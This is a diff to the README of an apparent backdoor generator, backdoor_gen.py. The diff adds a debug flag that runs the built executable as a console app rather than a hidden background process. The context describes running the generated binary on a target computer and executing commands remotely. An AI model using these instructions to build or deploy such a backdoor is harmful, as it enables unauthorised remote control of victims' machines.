@@ -50,6 +50,10 @@ We can also add an icon for executable by using -i option:
 
 `C:\> python3 backdoor_gen.py <token> <bot_nickname> <file_name> -i <path>`
 
+Debug option for running the binary as console app instead of background process:
+
+`C:\> python3 backdoor_gen.py <token> <bot_nickname> <file_name> -d`
+
 The generated executable on the dist folder now can be executed on a target computer (of course, with internet connection).
 
 # Executing command on the server
